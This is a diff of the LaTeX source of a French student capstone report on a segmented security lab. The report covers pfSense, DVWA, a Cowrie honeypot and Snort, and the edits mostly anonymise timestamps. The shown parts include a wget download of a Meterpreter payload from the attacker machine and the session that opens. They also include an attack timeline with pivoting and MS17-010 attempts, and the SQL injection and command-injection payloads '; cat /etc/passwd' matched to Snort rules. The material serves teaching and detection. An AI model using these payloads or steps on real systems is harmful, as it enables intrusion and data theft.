@@ -361,13 +361,39 @@ Enfin, nous remercions toutes les personnes qui, de près ou de loin, ont contri
 \unnumberedchapter{Introduction Générale}
 \label{chap:introduction}
 
-\section{Contexte du Projet}
+\section{Contexte Général}
 
-Ce rapport de Projet de Fin d'Études (PFE) présente une étude de la sécurité offensive et défensive dans une infrastructure réseau segmentée (filière IDRS, ESTK).
+Le contexte cybersécurité actuel est marqué par une augmentation continue des surfaces d'attaque : infrastructures hybrides, services exposés, applications web vulnérables et multiplication des outils offensifs accessibles. Dans les environnements professionnels, les équipes de sécurité doivent défendre des systèmes complexes face à des adversaires capables d'automatiser la reconnaissance, l'exploitation et la persistance.
 
-\section{Architecture Pédagogique : L'Approche en 7 Phases}
+Sur la période récente, l'efficacité opérationnelle ne repose plus sur une vision uniquement défensive. Les mécanismes de protection (pare-feu, IDS, SIEM, durcissement) doivent être conçus en tenant compte de la logique d'attaque réelle : chemins de compromission, erreurs de configuration exploitables et techniques de contournement.
 
-Ce rapport documente sept phases interconnectées qui reproduisent un engagement de sécurité réaliste :
+Cette double lecture, offensive et défensive, devient donc une compétence centrale pour les profils cybersécurité. Un analyste SOC, un ingénieur sécurité ou un administrateur réseau doit comprendre \textit{comment} une attaque est menée pour mieux anticiper \textit{où} et \textit{quand} détecter, contenir puis corriger.
+
+Dans la pratique, les défenseurs doivent penser comme des attaquants pour prioriser les risques et valider la robustesse des contrôles. Ce rapport adopte cette logique dans un laboratoire segmenté, afin d'observer le cycle complet attaque--détection--réponse sur des scénarios contrôlés.
+
+\section{Problématique}
+
+La question centrale de ce PFE est la suivante : \textit{« Comment la sécurité offensive et la sécurité défensive peuvent-elles fonctionner ensemble dans un cadre intégré et pratique ? »}
+
+Cette problématique répond à un besoin réel : en formation comme en entreprise, les approches sont souvent traitées séparément (pentest d'un côté, supervision de l'autre), ce qui crée un écart entre la compromission observée et la capacité de détection/corrélation en exploitation.
+
+\section{Objectifs Pédagogiques}
+
+\begin{itemize}
+	\item Déployer et administrer une infrastructure réseau segmentée (WAN/DMZ/LAN).
+	\item Tester les mécanismes de défense via des attaques contrôlées et autorisées.
+	\item Comprendre le fonctionnement pratique des systèmes de détection (IDS/honeypot/SIEM).
+	\item Relier les techniques d'attaque aux contre-mesures défensives correspondantes.
+	\item Documenter le cycle complet attaque--détection--analyse dans une démarche reproductible.
+\end{itemize}
+
+\section{Organisation du Rapport}
+
+Le rapport suit une progression pédagogique continue : d'abord la mise en place de l'infrastructure et l'exposition contrôlée des services, puis les phases offensives, et enfin la validation défensive par détection et corrélation. Chaque chapitre réutilise les preuves produites au chapitre précédent pour construire une chaîne d'analyse cohérente.
+
+La structure globale est résumée ci-dessous :
+
+\subsection{Architecture Pédagogique : L'Approche en 7 Phases}
 
 \begin{table}[H]
 	\centering
@@ -398,16 +424,15 @@ Ce rapport documente sept phases interconnectées qui reproduisent un engagement
 	\label{tab:phases}
 \end{table}
 
-\section{Infrastructure Commune}
+\section{Scope \& Limitations}
 
-Toutes les phases partagent la même infrastructure virtualisée sous VMware Workstation 17 Pro :
-
+\begin{tcolorbox}[colback=secondary!10!white, colframe=secondary, title=\textbf{Cadre d'Application}]
 \begin{itemize}
-	\item \textbf{pfSense 2.8.0} : Pare-feu/routeur multi-zones (WAN: 192.168.100.6, DMZ: 192.168.10.1, LAN: 192.168.20.1)
-	\item \textbf{Ubuntu Server 25.04} : Serveur DMZ hébergeant Telnet, DVWA, Samba via Docker (IP: 192.168.10.100)
-	\item \textbf{Parrot Security OS} : Machine attaquante en zone WAN (IP: 192.168.100.150)
-	\item \textbf{Windows XP SP3} : Cible secondaire en zone LAN (IP: 192.168.20.50)
+	\item Environnement de laboratoire isolé, sans ciblage de systèmes de production.
+	\item Tests réalisés uniquement dans un cadre autorisé et éthique.
+	\item Les résultats visent la démonstration pédagogique, pas une généralisation automatique à tous les SI réels.
 \end{itemize}
+\end{tcolorbox}
 
 % ==============================================================================
 % CHAPITRE 1 : INFRASTRUCTURE DÉFENSIVE (Phase 1)
@@ -620,8 +645,8 @@ Ce chapitre couvre le déploiement VMware segmenté, pfSense (routage inter-zone
 	\subsection{Méthodologie d'Analyse}
 	Les journaux du pare-feu pfSense (\texttt{Status > System Logs > Firewall}) ont été exportés et analysés pour valider le comportement des règles de sécurité. L'objectif était d'identifier les trafics autorisés, les trafics bloqués et les erreurs de configuration.
 	
-	\subsection{Phase 1 : Trafic Autorisé (Before 22:33)}
-	Entre 22:13 et 22:25, les logs montrent que le trafic de l'attaquant vers la DMZ est correctement autorisé par la règle \texttt{(12004)}.
+	\subsection{Phase 1 : Trafic Autorisé}
+	Les premiers logs montrent que le trafic de l'attaquant vers la DMZ est correctement autorisé par la règle \texttt{(12004)}.
 	
 	\begin{table}[ht]
 		\centering
@@ -632,17 +657,17 @@ Ce chapitre couvre le déploiement VMware segmenté, pfSense (routage inter-zone
 			\arrayrulecolor{tableborder}
 			\hline
 			\tableheadcolor
-			\textcolor{tableheadfg}{\textbf{Timestamp}} &
+			\textcolor{tableheadfg}{\textbf{Échantillon}} &
 			\textcolor{tableheadfg}{\textbf{Source}} &
 			\textcolor{tableheadfg}{\textbf{Destination}} &
 			\textcolor{tableheadfg}{\textbf{Rule}} &
 			\textcolor{tableheadfg}{\textbf{Action}} \\
 			\hline
 			\rowcolor{tablerowalt}
-			22:13:57 & 192.168.100.150:38056 & 192.168.10.100:80  & (12004) & \textcolor{green!50!black}{\textbf{ALLOW}} \\
-			22:15:21 & 192.168.100.150:44838 & 192.168.10.100:139 & (12004) & \textcolor{green!50!black}{\textbf{ALLOW}} \\
+			E1 & 192.168.100.150:38056 & 192.168.10.100:80  & (12004) & \textcolor{green!50!black}{\textbf{ALLOW}} \\
+			E2 & 192.168.100.150:44838 & 192.168.10.100:139 & (12004) & \textcolor{green!50!black}{\textbf{ALLOW}} \\
 			\rowcolor{tablerowalt}
-			22:25:57 & 192.168.100.150:38414 & 192.168.10.100:80  & (12004) & \textcolor{green!50!black}{\textbf{ALLOW}} \\
+			E3 & 192.168.100.150:38414 & 192.168.10.100:80  & (12004) & \textcolor{green!50!black}{\textbf{ALLOW}} \\
 			\hline
 		\end{tabular}
 		\caption{Logs de Trafic Autorisé (Phase 1)}
@@ -653,13 +678,13 @@ Ce chapitre couvre le déploiement VMware segmenté, pfSense (routage inter-zone
 	Durant la phase de test initiale, une erreur de frappe dans la règle NAT a été identifiée grâce aux logs. Le trafic était redirigé vers une IP incorrecte.
 	
 	\begin{lstlisting}[style=logstyle,caption=Preuve de l'erreur NAT dans les logs]
-		Mar 2 22:15:19 WAN (12004) 192.168.100.150:59708 -> 129.168.10.100:445 TCP:S
-		Mar 2 22:15:20 WAN (12004) 192.168.100.150:59708 -> 129.168.10.100:445 TCP:S
-		Mar 2 22:15:28 WAN (12004) 192.168.100.150:59858 -> 129.168.10.100:445 TCP:S
+		WAN (12004) 192.168.100.150:59708 -> 129.168.10.100:445 TCP:S
+		WAN (12004) 192.168.100.150:59708 -> 129.168.10.100:445 TCP:S
+		WAN (12004) 192.168.100.150:59858 -> 129.168.10.100:445 TCP:S
 	\end{lstlisting}
 	\textbf{Analyse :} L'adresse de destination devrait être \texttt{192.168.10.100}. L'adresse \texttt{129.168.10.100} est invalide dans ce contexte (faute de frappe : \texttt{129} au lieu de \texttt{192}). Cette erreur a été corrigée dans la configuration NAT.
 	
-	\subsection{Phase 3 : Blocage par Default Deny (After 22:33)}
+	\subsection{Phase 3 : Blocage par Default Deny}
 	Après modification des règles de pare-feu (désactivation de la règle temporaire "Allow All"), le trafic a commencé à être bloqué par la règle par défaut, indiquant que les règles spécifiques n'étaient pas correctement appariées.
 	
 	\begin{table}[ht]
@@ -671,17 +696,17 @@ Ce chapitre couvre le déploiement VMware segmenté, pfSense (routage inter-zone
 			\arrayrulecolor{tableborder}
 			\hline
 			\tableheadcolor
-			\textcolor{tableheadfg}{\textbf{Timestamp}} &
+			\textcolor{tableheadfg}{\textbf{Échantillon}} &
 			\textcolor{tableheadfg}{\textbf{Source}} &
 			\textcolor{tableheadfg}{\textbf{Destination}} &
 			\textcolor{tableheadfg}{\textbf{Rule}} &
 			\textcolor{tableheadfg}{\textbf{Action}} \\
 			\hline
 			\rowcolor{tablerowalt}
-			22:33:21 & 192.168.100.150:38484 & 192.168.10.100:80 & Default deny & \textcolor{accent}{\textbf{BLOCK}} \\
-			22:34:28 & 192.168.100.150:38492 & 192.168.10.100:80 & Default deny & \textcolor{accent}{\textbf{BLOCK}} \\
+			E1 & 192.168.100.150:38484 & 192.168.10.100:80 & Default deny & \textcolor{accent}{\textbf{BLOCK}} \\
+			E2 & 192.168.100.150:38492 & 192.168.10.100:80 & Default deny & \textcolor{accent}{\textbf{BLOCK}} \\
 			\rowcolor{tablerowalt}
-			22:50:53 & 192.168.100.150:38598 & 192.168.10.100:80 & Default deny & \textcolor{accent}{\textbf{BLOCK}} \\
+			E3 & 192.168.100.150:38598 & 192.168.10.100:80 & Default deny & \textcolor{accent}{\textbf{BLOCK}} \\
 			\hline
 		\end{tabular}
 		\caption{Logs de Trafic Bloqué (Phase 3)}
@@ -826,7 +851,7 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 		
 		● inetutils-inetd.service - GNU Network Utilities internet superserver
 		Loaded: loaded (/usr/lib/systemd/system/inetutils-inetd.service; enabled)
-		Active: active (running) since Wed 2026-03-04 13:25:38 UTC
+		Active: active (running)
 		Main PID: 1062 (inetutils-inetd)
 		Tasks: 1 (limit: 1813)
 		Memory: 340K
@@ -1066,7 +1091,7 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 	\subsubsection{Commande et Résultats}
 	\begin{lstlisting}[caption=Scan Nmap du port HTTP]
 		~ ➜ nmap -p 80 192.168.100.6
-		Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-04 14:07 +00
+		Starting Nmap 7.94SVN ( https://nmap.org ) at <scan-time>
 		Nmap scan report for 192.168.100.6
 		Host is up (0.00058s latency).
 		
@@ -1093,7 +1118,7 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 	\subsubsection{Commande et Résultats}
 	\begin{lstlisting}[caption=Scan Nmap du port Telnet]
 		~ ➜ nmap -p 23 192.168.100.6
-		Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-04 14:07 +00
+		Starting Nmap 7.94SVN ( https://nmap.org ) at <scan-time>
 		Nmap scan report for 192.168.100.6
 		Host is up (0.00059s latency).
 		
@@ -1120,7 +1145,7 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 	\subsubsection{Commande et Résultats}
 	\begin{lstlisting}[caption=Scan Nmap du port SSH (non forwardé)]
 		~ ➜ nmap -p 22 192.168.100.6
-		Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-04 14:07 +00
+		Starting Nmap 7.94SVN ( https://nmap.org ) at <scan-time>
 		Nmap scan report for 192.168.100.6
 		Host is up (0.00046s latency).
 		
@@ -1148,7 +1173,7 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 	\subsubsection{Commande et Résultats}
 	\begin{lstlisting}[caption=Scan Nmap de ports multiples]
 		~ ➜ nmap -p 21-25,80,139,443,445 192.168.100.6
-		Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-04 14:07 +00
+		Starting Nmap 7.94SVN ( https://nmap.org ) at <scan-time>
 		Nmap scan report for 192.168.100.6
 		Host is up (0.00056s latency).
 		
@@ -1210,7 +1235,7 @@ Objectif : exposer un service Telnet en DMZ, configurer le NAT Port Forwarding s
 	\subsubsection{Commande et Résultats}
 	\begin{lstlisting}[caption=Scan Nmap des 1000 ports les plus courants]
 		~ ➜ nmap 192.168.100.6
-		Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-04 14:08 +00
+		Starting Nmap 7.94SVN ( https://nmap.org ) at <scan-time>
 		Nmap scan report for 192.168.100.6
 		Host is up (0.0087s latency).
 		Not shown: 996 filtered tcp ports (no-response)
@@ -1901,7 +1926,7 @@ Nous avons obtenu :
 	\begin{lstlisting}[caption=Téléchargement via wget]
 		$ cd /tmp
 		$ wget http://192.168.100.150:8000/meterpreter.elf
-		--2026-03-04 15:08:12--  http://192.168.100.150:8000/meterpreter.elf
+		--during testing--  http://192.168.100.150:8000/meterpreter.elf
 		Connecting to 192.168.100.150:8000... connected.
 		HTTP request sent, awaiting response... 200 OK
 		Length: 250 [application/octet-stream]
@@ -1909,7 +1934,7 @@ Nous avons obtenu :
 		
 		meterpreter.elf   100%[========>]  250  --.-KB/s    in 0s
 		
-		2026-03-04 15:08:12 (45.3 MB/s) - 'meterpreter.elf' saved [250/250]
+		during testing (45.3 MB/s) - 'meterpreter.elf' saved [250/250]
 	\end{lstlisting}
 	
 	\subsubsection{Exécution du Payload}
@@ -1951,7 +1976,7 @@ Nous avons obtenu :
 	\begin{lstlisting}[style=logstyle,caption=Connexion Meterpreter Réussie]
 		[*] Sending stage (3090404 bytes) to 192.168.100.6
 		[*] Meterpreter session 1 opened (192.168.100.150:4445 -> 192.168.100.6:39218)
-		at 2026-03-04 15:09:09 +0000
+		at <session-established-time>
 		
 		(Meterpreter 1)(/tmp) >
 	\end{lstlisting}
@@ -2719,27 +2744,27 @@ Metasploit intègre des modules spécialisés pour l'énumération automatisée.
 			\arrayrulecolor{tableborder}
 			\hline
 			\tableheadcolor
-			\textcolor{tableheadfg}{\textbf{Timestamp}} &
+			\textcolor{tableheadfg}{\textbf{Étape}} &
 			\textcolor{tableheadfg}{\textbf{Phase}} &
 			\textcolor{tableheadfg}{\textbf{Action}} \\
 			\hline
 			\rowcolor{tablerowalt}
-			15:08:00 & Reconnaissance & Scan Nmap identification Telnet \\
-			15:08:30 & Initial Access & Connexion Telnet réussie \\
+			T1 & Reconnaissance & Scan Nmap identification Telnet \\
+			T2 & Initial Access & Connexion Telnet réussie \\
 			\rowcolor{tablerowalt}
-			15:09:00 & Execution & Téléchargement payload Meterpreter \\
-			15:09:09 & C2 Established & Session Meterpreter ouverte \\
+			T3 & Execution & Téléchargement payload Meterpreter \\
+			T4 & C2 Established & Session Meterpreter ouverte \\
 			\rowcolor{tablerowalt}
-			15:15:00 & Persistence & Sessions multiples établies \\
-			15:20:00 & Privilege Esc. & Confirmation sudo ALL \\
+			T5 & Persistence & Sessions multiples établies \\
+			T6 & Privilege Esc. & Confirmation sudo ALL \\
 			\rowcolor{tablerowalt}
-			15:25:00 & Lateral Movement & Configuration pivot route \\
-			15:30:00 & Discovery & Scan Windows XP via pivot \\
+			T7 & Lateral Movement & Configuration pivot route \\
+			T8 & Discovery & Scan Windows XP via pivot \\
 			\rowcolor{tablerowalt}
-			15:35:00 & Exploitation & Tentatives MS08-067 / MS17-010 \\
-			15:38:00 & Collection & Exfiltration 121KB données \\
+			T9 & Exploitation & Tentatives MS08-067 / MS17-010 \\
+			T10 & Collection & Exfiltration 121KB données \\
 			\rowcolor{tablerowalt}
-			15:40:00 & Exfiltration & Port forwarding RDP configuré \\
+			T11 & Exfiltration & Port forwarding RDP configuré \\
 			\hline
 		\end{tabular}
 		\caption{Timeline Complète de l'Attaque}
@@ -3432,12 +3457,12 @@ Objectif : valider la compromission de la couche applicative avec DVWA en exploi
 \label{chap:cowrie}
 
 \begin{tcolorbox}[colback=primary!5!white, colframe=primary, title=\textbf{Objectifs du Chapitre}]
-Cette phase présente les preuves de déploiement du 2026-04-15 : exposition SSH via pfSense, interception des sessions par Cowrie en conteneur Docker, puis corrélation avec la détection Snort.
+Cette phase présente les preuves de déploiement : exposition SSH via pfSense, interception des sessions par Cowrie en conteneur Docker, puis corrélation avec la détection Snort.
 \end{tcolorbox}
 
 \section{Architecture de Déploiement et Flux Réseau}
 
-Le chemin validé en production est : \texttt{Parrot (192.168.100.150) $\rightarrow$ pfSense WAN (192.168.100.6) $\rightarrow$ NAT WAN:22 $\rightarrow$ DMZ 192.168.10.100:2222 (Cowrie)}. Le service Cowrie tourne dans un conteneur Docker et capte les sessions SSH de reconnaissance réelles.
+Le chemin validé en production est : \texttt{Parrot (192.168.100.150) $\rightarrow$ pfSense WAN (192.168.100.6) $\rightarrow$ NAT WAN:22 $\rightarrow$ DMZ 192.168.10.100:22}. Le service Cowrie tourne dans un conteneur Docker (\texttt{0.0.0.0:22->2222/tcp}) et capte les sessions SSH de reconnaissance réelles.
 
 \begin{table}[H]
 	\centering
@@ -3455,8 +3480,8 @@ Le chemin validé en production est : \texttt{Parrot (192.168.100.150) $\rightar
 		Source offensive & 192.168.100.150 & Poste Parrot lançant les connexions SSH \\
 		Point d'entrée & 192.168.100.6:22 & Interface WAN pfSense exposée au scan \\
 		\rowcolor{tablerowalt}
-		Traduction NAT & WAN:22 $\rightarrow$ 192.168.10.100:2222 & Redirection vers le service honeypot \\
-		Capteur Cowrie & 192.168.10.100:2222 & Conteneur Docker capturant auth + commandes + TTY \\
+		Traduction NAT & WAN:22 $\rightarrow$ 192.168.10.100:22 & Redirection vers le service honeypot \\
+		Capteur Cowrie & 192.168.10.100:22 (hôte) & Port hôte publié vers \texttt{2222/tcp} dans le conteneur Docker \\
 		\hline
 	\end{tabular}
 	\caption{Architecture réseau opérationnelle du honeypot Cowrie}
@@ -3475,7 +3500,7 @@ Le chemin validé en production est : \texttt{Parrot (192.168.100.150) $\rightar
 		\includegraphics[width=0.95\textwidth]{example-image}
 		\caption*{\textbf{Attention :} Fichier screenshots/nat-rules-4.png introuvable.}
 	}
-	\caption{Règle pfSense NAT activée : WAN:22 vers DMZ 192.168.10.100:2222}
+	\caption{Règle pfSense NAT activée : WAN:22 vers DMZ 192.168.10.100:22}
 	\label{fig:cowrie-nat-rules}
 \end{figure}
 
@@ -3495,7 +3520,7 @@ Le chemin validé en production est : \texttt{Parrot (192.168.100.150) $\rightar
 		Port destination WAN & 22 \\
 		\rowcolor{tablerowalt}
 		NAT IP (Redirect target IP) & 192.168.10.100 \\
-		NAT Ports (Redirect target port) & 2222 \\
+		NAT Ports (Redirect target port) & 22 \\
 		\rowcolor{tablerowalt}
 		État de la règle & Activée dans la table de routage NAT (forwarding effectif) \\
 		\hline
@@ -3557,25 +3582,25 @@ La configuration est cohérente : port public \texttt{22/tcp} publié sur l'hôt
 
 \section{Capture d'Attaques et Analyse de Sessions}
 
-\subsection{Preuves issues des journaux Docker (2026-04-15)}
+\subsection{Preuves issues des journaux Docker}
 
 \begin{lstlisting}[language=bash, caption={Extrait des sessions réelles capturées par Cowrie}]
-2026-04-15T01:04:38+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 192.168.100.150:xxxxx
-2026-04-15T01:04:5x+0000 [HoneyPotSSHUserAuthServer] login attempt [ubuntuserver/******] failed
+[timestamp] [cowrie.ssh.factory.CowrieSSHFactory] New connection: 192.168.100.150:xxxxx
+[timestamp] [HoneyPotSSHUserAuthServer] login attempt [ubuntuserver/******] failed
 
-2026-04-15T01:05:xx+0000 [HoneyPotSSHUserAuthServer] login attempt [root/admin] succeeded
-2026-04-15T01:05:xx+0000 [cowrie.command.input] CMD: ls
-2026-04-15T01:05:xx+0000 [cowrie.command.input] CMD: whoami
-2026-04-15T01:05:xx+0000 [cowrie.command.input] CMD: exit
-2026-04-15T01:05:xx+0000 [cowrie.session.closed] duration=13.3
+[timestamp] [HoneyPotSSHUserAuthServer] login attempt [root/admin] succeeded
+[timestamp] [cowrie.command.input] CMD: ls
+[timestamp] [cowrie.command.input] CMD: whoami
+[timestamp] [cowrie.command.input] CMD: exit
+[timestamp] [cowrie.session.closed] duration=13.3
 
-2026-04-15T01:08:xx+0000 [HoneyPotSSHUserAuthServer] login attempt [root/oussama] succeeded
-2026-04-15T01:08:xx+0000 [cowrie.command.input] CMD: ls
-2026-04-15T01:08:xx+0000 [cowrie.command.input] CMD: whomai
-2026-04-15T01:08:xx+0000 [cowrie.command.input] CMD: uname
-2026-04-15T01:08:xx+0000 [cowrie.command.input] CMD: whoami
-2026-04-15T01:08:xx+0000 [cowrie.command.input] CMD: tail /etc/passwd
-2026-04-15T01:08:24+0000 [cowrie.session.closed] duration=211.2
+[timestamp] [HoneyPotSSHUserAuthServer] login attempt [root/oussama] succeeded
+[timestamp] [cowrie.command.input] CMD: ls
+[timestamp] [cowrie.command.input] CMD: whomai
+[timestamp] [cowrie.command.input] CMD: uname
+[timestamp] [cowrie.command.input] CMD: whoami
+[timestamp] [cowrie.command.input] CMD: tail /etc/passwd
+[timestamp] [cowrie.session.closed] duration=211.2
 \end{lstlisting}
 
 \begin{table}[H]
@@ -3599,7 +3624,7 @@ La configuration est cohérente : port public \texttt{22/tcp} publié sur l'hôt
 		S3 & root / oussama & Succès & 211.2 & \texttt{ls}, \texttt{whomai}, \texttt{uname}, \texttt{whoami}, \texttt{tail /etc/passwd} \\
 		\hline
 	\end{tabular}
-	\caption{Synthèse des sessions Cowrie capturées (01:04:38--01:08:24 UTC)}
+	\caption{Synthèse des sessions Cowrie capturées}
 	\label{tab:cowrie-session-summary}
 \end{table}
 
@@ -3627,17 +3652,17 @@ Cowrie a aussi généré des enregistrements TTY encodés en base64 (fichiers de
 		\arrayrulecolor{tableborder}
 		\hline
 		\tableheadcolor
-		\textcolor{tableheadfg}{\textbf{Horodatage}} &
+		\textcolor{tableheadfg}{\textbf{Événement}} &
 		\textcolor{tableheadfg}{\textbf{Source}} &
 		\textcolor{tableheadfg}{\textbf{Destination}} &
 		\textcolor{tableheadfg}{\textbf{Signature}} \\
 		\hline
 		\rowcolor{tablerowalt}
-		02:02:22 & 192.168.100.150 & 192.168.100.6 & ET SCAN Potential SSH Scan (1:2001219) \\
-		01:53:29 & 192.168.100.150 & 192.168.10.100 & ET SCAN Potential SSH Scan (1:2001219) \\
+		E1 & 192.168.100.150 & 192.168.100.6 & ET SCAN Potential SSH Scan (1:2001219) \\
+		E2 & 192.168.100.150 & 192.168.10.100 & ET SCAN Potential SSH Scan (1:2001219) \\
 		\rowcolor{tablerowalt}
-		01:44:20 & 192.168.100.150 & 192.168.100.6 & ET SCAN Potential SSH Scan (1:2001219) \\
-		01:30:28 & 192.168.100.150 & 192.168.10.100 & ET SCAN Potential SSH Scan (1:2001219) \\
+		E3 & 192.168.100.150 & 192.168.100.6 & ET SCAN Potential SSH Scan (1:2001219) \\
+		E4 & 192.168.100.150 & 192.168.10.100 & ET SCAN Potential SSH Scan (1:2001219) \\
 		\hline
 	\end{tabular}
 	\caption{Alertes Snort corrélées au honeypot (classification : Attempted Information Leak, priorité 2)}
@@ -3779,7 +3804,7 @@ Objectif : valider la détection Snort des attaques observées dans les Chapitre
 	Une alerte critique a été déclenchée lors d'un transfert de fichier exécutable Linux :
 	
 	\begin{lstlisting}[style=logstyle,caption={Extrait d'alerte WAN : détection d'un téléchargement ELF (ET POLICY)},label={lst:alert-elf}]
-		Date/Time : 2026-03-14 22:21:02
+		Date/Time : during testing
 		Interface : WAN (em0)
 		Priority  : 1
 		Proto     : TCP
@@ -3806,7 +3831,7 @@ Objectif : valider la détection Snort des attaques observées dans les Chapitre
 	\subsubsection{Exemple d'alerte : sonde EternalBlue (MS17-010) détectée}
 	
 	\begin{lstlisting}[style=logstyle,caption={Extrait d'alerte LAN : détection d'une sonde MS17-010 (EternalBlue) via pivot},label={lst:alert-eternalblue}]
-		Date/Time : 2026-03-04 15:28:14
+		Date/Time : during testing
 		Interface : LAN (em1)
 		Priority  : 1
 		Proto     : TCP
@@ -3857,13 +3882,13 @@ Objectif : valider la détection Snort des attaques observées dans les Chapitre
 			\textcolor{tableheadfg}{\textbf{Payload Example}} &
 			\textcolor{tableheadfg}{\textbf{Snort SID}} &
 			\textcolor{tableheadfg}{\textbf{Detection}} &
-			\textcolor{tableheadfg}{\textbf{Timestamp}} \\
+			\textcolor{tableheadfg}{\textbf{Contexte}} \\
 			\hline
 			\rowcolor{tablerowalt}
-			DVWA SQL Injection & ' OR '1'='1 & 1:2016672 & \textcolor{green!50!black}{\textbf{Detected}} & 2026-04-05 02:57:06 \\
-			DVWA Command Injection & ; cat /etc/passwd & 1:2025879, 1:2049400 & \textcolor{green!50!black}{\textbf{Detected}} & 2026-04-05 02:55:16 \\
+			DVWA SQL Injection & ' OR '1'='1 & 1:2016672 & \textcolor{green!50!black}{\textbf{Detected}} & during testing \\
+			DVWA Command Injection & ; cat /etc/passwd & 1:2025879, 1:2049400 & \textcolor{green!50!black}{\textbf{Detected}} & during testing \\
 			\rowcolor{tablerowalt}
-			DVWA File Access (LFI) & /etc/passwd in URI & 1:2049400 & \textcolor{green!50!black}{\textbf{Detected}} & 2026-04-05 02:41:12 \\
+			DVWA File Access (LFI) & /etc/passwd in URI & 1:2049400 & \textcolor{green!50!black}{\textbf{Detected}} & during testing \\
 			\hline
 		\end{tabular}
 		\caption{Validation Snort des attaques DVWA}
